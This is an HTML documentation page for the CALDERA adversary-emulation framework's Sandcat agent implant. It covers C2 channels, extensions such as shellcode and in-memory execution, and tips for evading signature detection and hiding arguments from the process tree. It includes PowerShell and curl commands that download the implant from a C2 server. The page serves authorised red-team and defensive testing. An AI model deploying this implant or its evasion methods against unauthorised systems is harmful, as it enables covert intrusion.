@@ -1,0 +1,443 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Sandcat Plugin Details &mdash; caldera  documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="../../_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Exfiltration Scenarios and Setup" href="../stockpile/Exfiltration-How-Tos.html" />
+    <link rel="prev" title="Resources" href="../../resources.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html">
+          
+
+          
+            
+            <img src="../../_static/caldera-logo.png" class="logo" alt="Logo"/>
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../Installing-CALDERA.html">Installing CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Getting-started.html">Getting started</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Learning-the-terminology.html">Learning the terminology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Basic-Usage.html">Basic Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Server-Configuration.html">Server Configuration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Plugin-library.html">Plugin library</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Parsers.html">Parsers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Relationships.html">Relationships</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Requirements.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Objectives.html">Objectives</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Operation-Results.html">Operation Results</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Initial-Access-Attacks.html">Initial Access Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Lateral-Movement-Guide.html">Windows Lateral Movement Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Exfiltration.html">Exfiltration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Sandcat-Peer-to-Peer.html">Peer-to-Peer Proxy Functionality for Sandcat Agents</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../C2-Tunneling.html">C2 Communications Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../Troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../resources.html">Resources</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Sandcat Plugin Details</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#source-code">Source Code</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#precompiled-binaries">Precompiled Binaries</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#deploy">Deploy</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#options">Options</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#extensions">Extensions</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#exit-codes">Exit Codes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#customizing-default-options-execution-without-cli-options">Customizing Default Options &amp; Execution Without CLI Options</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../The-REST-API.html">The REST API</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../How-to-Build-Plugins.html">How to Build Plugins</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../How-to-Build-Planners.html">How to Build Planners</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../How-to-Build-Agents.html">How to Build Agents</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../_generated/modules.html">app</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">caldera</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html">Docs</a> &raquo;</li>
+        
+      <li>Sandcat Plugin Details</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../../_sources/plugins/sandcat/Sandcat-Details.md.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="sandcat-plugin-details">
+<h1>Sandcat Plugin Details<a class="headerlink" href="#sandcat-plugin-details" title="Permalink to this heading">¶</a></h1>
+<p>The Sandcat plugin provides CALDERA with its default agent implant, Sandcat.
+The agent is written in GoLang for cross-platform compatibility and can currently be compiled to run on
+Windows, Linux, and MacOS targets.</p>
+<p>While the CALDERA C2 server requires GoLang to be installed in order to compile agent binaries,
+no installation is required on target machines - the agent program will simply run as an executable.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">sandcat</span></code> plugin does come with precompiled binaries, but these only contain the basic
+agent features and are more likely to be flagged by AV as they are publicly available on GitHub.</p>
+<p>If you wish to dynamically compile agents to produce new hashes or include additional agent features,
+the C2 server must have GoLang installed.</p>
+<div class="section" id="source-code">
+<h2>Source Code<a class="headerlink" href="#source-code" title="Permalink to this heading">¶</a></h2>
+<p>The source code for the sandcat agent is located in the <code class="docutils literal notranslate"><span class="pre">gocat</span></code> and <code class="docutils literal notranslate"><span class="pre">gocat-extensions</span></code> directories.
+<code class="docutils literal notranslate"><span class="pre">gocat</span></code> contains the core agent code, which provides all of the basic features.
+<code class="docutils literal notranslate"><span class="pre">gocat-extensions</span></code> contains source code for extensions that can be compiled into new agent binaries on demand.
+The extensions are kept separate to keep the agent lightweight and to allow more flexibility when catering to
+various use cases.</p>
+</div>
+<div class="section" id="precompiled-binaries">
+<h2>Precompiled Binaries<a class="headerlink" href="#precompiled-binaries" title="Permalink to this heading">¶</a></h2>
+<p>Precompiled agent binaries are located in the <code class="docutils literal notranslate"><span class="pre">payloads</span></code> directory and are referenced with the following filename:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">sandcat.go-darwin</span></code> compiled binary for Mac targets</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">sandcat.go-linux</span></code> compiled binary for Linux targets</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">sandcat.go-windows</span></code> compiled binary for Windows targets.</p></li>
+</ul>
+<p>These files get updated when dynamically compiling agents, so they will always contain the
+latest compiled version on your system.</p>
+</div>
+<div class="section" id="deploy">
+<h2>Deploy<a class="headerlink" href="#deploy" title="Permalink to this heading">¶</a></h2>
+<p>To deploy Sandcat, use one of the built-in delivery commands from the main server GUI which allows you to run the agent
+on Windows, Mac, or Linux.</p>
+<p>Each of these commands downloads a compiled Sandcat executable from CALDERA and runs it immediately.</p>
+<p>Once the agent is running, it should show log messages when it beacons into CALDERA.</p>
+<blockquote>
+<div><p>If you have GoLang installed on the CALDERA server, each time you run one of the delivery commands above,
+the agent will re-compile itself dynamically to obtain a new file hash. This will help bypass file-based signature detections.</p>
+</div></blockquote>
+<div class="section" id="options">
+<h3>Options<a class="headerlink" href="#options" title="Permalink to this heading">¶</a></h3>
+<p>When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">-server</span> <span class="pre">[C2</span> <span class="pre">endpoint]</span></code>: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. <code class="docutils literal notranslate"><span class="pre">-server</span> <span class="pre">http://10.0.0.1:8888</span></code>, <code class="docutils literal notranslate"><span class="pre">-server</span> <span class="pre">10.0.0.1:53</span></code>, <code class="docutils literal notranslate"><span class="pre">-server</span> <span class="pre">https://example.com</span></code>). The agent must have connectivity to this endpoint.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-group</span> <span class="pre">[group</span> <span class="pre">name]</span></code>: This is the group name that you would like the agent to join when it starts. The group does not have to exist beforehand. A default group of <code class="docutils literal notranslate"><span class="pre">red</span></code> will be used if this option is not provided (e.g. <code class="docutils literal notranslate"><span class="pre">-group</span> <span class="pre">red</span></code>, <code class="docutils literal notranslate"><span class="pre">-group</span> <span class="pre">mygroup</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-v</span></code>: Toggle verbose output from sandcat. If this flag is not set, sandcat will run silently. This only applies to output that would be displayed on the target machine, for instance if running sandcat from a terminal window. This option does not affect the information that gets sent to the C2 server.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-httpProxyGateway</span> <span class="pre">[gateway]</span></code>: Sets the HTTP proxy gateway if running Sandcat in environments that use proxies to reach the internet</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-paw</span> <span class="pre">[identifier]</span></code>: Optionally assign the agent with an identifier value. By default, the agent will be assigned a random identifier by the C2 server.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">[C2</span> <span class="pre">method</span> <span class="pre">name]</span></code>: Instruct the agent to connect to the C2 server using the given C2 communication method. By default, the agent will use HTTP(S). The following C2 channels are currently supported:</p>
+<ul>
+<li><p>HTTP(S) (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">HTTP</span></code>, or simply exclude the <code class="docutils literal notranslate"><span class="pre">c2</span></code> option)</p></li>
+<li><p>DNS Tunneling (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">DnsTunneling</span></code>): requires the agent to be compiled with the DNS tunneling extension.</p></li>
+<li><p>FTP (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">FTP</span></code>): requires the agent to be compiled with the FTP extension</p></li>
+<li><p>Github GIST (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">GIST</span></code>): requires the agent to be compiled with the Github Gist extension</p></li>
+<li><p>Slack (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">Slack</span></code>): requires the agent to be compiled with the Slack extension</p></li>
+<li><p>SMB Pipes (<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">SmbPipe</span></code>): allows the agent to connect to another agent peer via SMB pipes to route traffic through an agent proxy to the C2 server. Cannot be used to connect directly to the C2. Requires the agent to be compiled with the <code class="docutils literal notranslate"><span class="pre">proxy_smb_pipe</span></code> SMB pipe extension.</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-delay</span> <span class="pre">[number</span> <span class="pre">of</span> <span class="pre">seconds]</span></code>: pause the agent for the specified number of seconds before running</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-listenP2P</span></code>: Toggle peer-to-peer listening mode. When enabled, the agent will listen for and accept peer-to-peer connections from other agents. This feature can be leveraged in environments where users want agents within an internal network to proxy through another agent in order to connect to the C2 server.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">-originLinkID</span> <span class="pre">[link</span> <span class="pre">ID]</span></code>: associated the agent with the operation instruction with the given link ID. This allows the C2 server to map out lateral movement by determining which operation instructions spawned which agents.</p></li>
+</ul>
+<p>Additionally, the sandcat agent can tunnel its communications to the C2 using the following options (for more details, see the <a class="reference internal" href="../../C2-Tunneling.html"><span class="doc std std-doc">C2 tunneling documentation</span></a></p>
+</div>
+</div>
+<div class="section" id="extensions">
+<h2>Extensions<a class="headerlink" href="#extensions" title="Permalink to this heading">¶</a></h2>
+<p>In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality.
+Users can dynamically compile additional features, referred to as “gocat extensions”.
+Each extension is temporarily added to the existing core sandcat code to provide functionality such as peer-to-peer proxy implementations, additional
+executors, and additional C2 communication protocols.</p>
+<p>To request particular extensions, users must include the <code class="docutils literal notranslate"><span class="pre">gocat-extensions</span></code> HTTP header when asking the C2 to compile an agent.
+The header value must be a comma-separated list of requested extensions.
+The server will include the extensions in the binary if they exist and if their dependencies are met (i.e. if the extension requires a particular
+GoLang module that is not installed on the server, then the extension will not be included).</p>
+<p>Below is an example PowerShell snippet to request the C2 server to include the <code class="docutils literal notranslate"><span class="pre">proxy_http</span></code> and <code class="docutils literal notranslate"><span class="pre">shells</span></code>
+extensions:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$url=&quot;http://192.168.137.1:8888/file/download&quot;; # change server IP/port as needed
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(&quot;platform&quot;,&quot;windows&quot;); # specifying Windows build
+$wc.Headers.add(&quot;file&quot;,&quot;sandcat.go&quot;); # requesting sandcat binary
+$wc.Headers.add(&quot;gocat-extensions&quot;,&quot;proxy_http,shells&quot;); # requesting the extensions
+$output=&quot;C:\Users\Public\sandcat.exe&quot;; # specify destination filename
+$wc.DownloadFile($url,$output); # download
+</pre></div>
+</div>
+<p>The following features are included in the stock default agent:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">HTTP</span></code> C2 contact protocol for HTTP(S)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">psh</span></code> PowerShell executor (Windows)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">cmd</span></code> cmd.exe executor (Windows)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">sh</span></code> shell executor (Linux/Mac)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">proc</span></code> executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)</p></li>
+<li><p>SSH tunneling to tunnel traffic to the C2 server.</p></li>
+</ul>
+<p>Additional functionality can be found in the following agent extensions:</p>
+<p><strong>C2 Communication Extensions</strong></p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">gist</span></code>: provides the Github Gist C2 contact protocol. Requires the following GoLang modules:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">github.com/google/go-github/github</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">golang.org/x/oauth2</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">dns_tunneling</span></code>: provides the DNS tunneling C2 communication protocol. Requires the following GoLang modules:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">github.com/miekg/dns</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ftp</span></code>: provides the FTP C2 communication protocol. Requires the following GoLang modules:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">github.com/jlaffaye/ftp</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">slack</span></code>: provides the Slack C2 communication protocol.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">proxy_http</span></code>: allows the agent to accept peer-to-peer messages via HTTP. Not required if the agent is simply using HTTP to connect to a peer (acts the same as connecting direclty to the C2 server over HTTP).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">proxy_smb_pipe</span></code>: provides the <code class="docutils literal notranslate"><span class="pre">SmbPipe</span></code> peer-to-peer proxy client and receiver for Windows (peer-to-peer communication via SMB named pipes).</p>
+<ul>
+<li><p>Requires the <code class="docutils literal notranslate"><span class="pre">gopkg.in/natefinch/npipe.v2</span></code> GoLang module</p></li>
+</ul>
+</li>
+</ul>
+<p><strong>Executor Extensions</strong></p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">shells</span></code>: provides the <code class="docutils literal notranslate"><span class="pre">osascript</span></code> (Mac Osascript), <code class="docutils literal notranslate"><span class="pre">pwsh</span></code> (Windows powershell core), and Python (<code class="docutils literal notranslate"><span class="pre">python2</span></code> and <code class="docutils literal notranslate"><span class="pre">python3</span></code>) executors.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">shellcode</span></code>: provides the shellcode executors.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">native</span></code>: provides basic native execution functionality, which leverages GoLang code to perform tasks rather than calling external binaries or commands.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">native_aws</span></code>: provides native execution functionality specific to AWS. Does not require the <code class="docutils literal notranslate"><span class="pre">native</span></code> extension, but does require the following GoLang modules:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">github.com/aws/aws-sdk-go</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">github.com/aws/aws-sdk-go/aws</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">donut</span></code>: provides the Donut functionality to execute certain .NET executables in memory. See https://github.com/TheWover/donut for additional information.</p></li>
+</ul>
+<p><strong>Other Extensions</strong></p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">shared</span></code> extension provides the C sharing functionality for Sandcat. This can be used to compile Sandcat as a DLL rather than a <code class="docutils literal notranslate"><span class="pre">.exe</span></code> for Windows targets.</p></li>
+</ul>
+</div>
+<div class="section" id="exit-codes">
+<h2>Exit Codes<a class="headerlink" href="#exit-codes" title="Permalink to this heading">¶</a></h2>
+<p>Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.</p>
+<p>Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">-1</span></code>: Error (e.g., cannot decode command, payload not available)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">0</span></code>: Success</p></li>
+</ul>
+<p>The following values describe exit codes utilized by specific executors:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">shells</span></code>: Returns the exit code provided by the OS/shell.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">shellcode</span></code>: Utilizes the general Sandcat exit codes.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">native</span></code> and <code class="docutils literal notranslate"><span class="pre">native_aws</span></code>:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">0</span></code>: Success</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">1</span></code>: Process error (e.g., error while executing code)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">2</span></code>: Input error (e.g., invalid parameters)</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">donut</span></code>: Returns the exit code provided by the OS/shell.</p></li>
+</ul>
+</div>
+<div class="section" id="customizing-default-options-execution-without-cli-options">
+<h2>Customizing Default Options &amp; Execution Without CLI Options<a class="headerlink" href="#customizing-default-options-execution-without-cli-options" title="Permalink to this heading">¶</a></h2>
+<p>It is possible to customize the default values of these options when pulling Sandcat from the CALDERA server.<br />
+This is useful if you want to hide the parameters from the process tree or if you cannot specify arguments when executing the agent binary.</p>
+<p>You can do this by passing the values in as headers when requesting the agent binary from the C2 server instead of as parameters when executing the binary.</p>
+<p>The following parameters can be specified this way:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">server</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">group</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">listenP2P</span></code></p></li>
+</ul>
+<p>For example, the following will download a linux executable that will use <code class="docutils literal notranslate"><span class="pre">http://10.0.0.2:8888</span></code> as the server address
+instead of <code class="docutils literal notranslate"><span class="pre">http://localhost:8888</span></code>, will set the group name to <code class="docutils literal notranslate"><span class="pre">mygroup</span></code> instead of the default <code class="docutils literal notranslate"><span class="pre">red</span></code>, and will enable the P2P listener:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">sk</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;file:sandcat.go&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;platform:linux&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;server:http://10.0.0.2:8888&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;group:mygroup&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;listenP2P:true&#39;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8888</span><span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">download</span> <span class="o">&gt;</span> <span class="n">sandcat</span>
+</pre></div>
+</div>
+<p>Additionally, if you want the C2 server to compile the agent with a built-in list of known peers (agents that are actively listening for peer-to-peer requests), you can do so with the following header:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">includeProxyPeers</span></code>
+Example usage:</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">includeProxyPeers:all</span></code> - include all peers, regardless of what proxy methods they are listening on</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">includeProxypeers:SmbPipe</span></code> - only include peers listening for SMB pipe proxy traffic</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">includeProxypeers:HTTP</span></code> - only include peers listening for HTTP proxy traffic.</p></li>
+</ul>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../stockpile/Exfiltration-How-Tos.html" class="btn btn-neutral float-right" title="Exfiltration Scenarios and Setup" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="../../resources.html" class="btn btn-neutral float-left" title="Resources" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2023, The MITRE Corporation
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
